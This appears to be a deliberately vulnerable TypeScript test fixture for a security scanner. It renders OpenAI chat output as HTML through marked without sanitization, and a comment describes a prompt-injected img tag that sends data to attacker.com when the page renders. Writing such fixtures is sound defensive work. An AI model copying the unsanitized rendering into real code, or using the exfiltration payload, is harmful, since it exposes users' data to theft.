/**
 * UNSAFE: LLM output rendered as Markdown without HTML sanitization.
 * Expected findings: OUT-002
 */
import OpenAI from 'openai';
import { marked } from 'marked';

const openai = new OpenAI();

export async function renderAssistantReply(userPrompt: string): Promise<string> {
  const completion = await openai.chat.completions.create({
    model: 'gpt-4o',
    messages: [{ role: 'user', content: userPrompt }],
  });

  const output = completion.choices[0].message.content ?? '';

  // Vulnerable: render model output as HTML with no sanitization step.
  // A prompt-injected <img src=https://attacker.com?d=...> exfiltrates data on render.
  const html = marked.parse(output);
  return html as string;
}
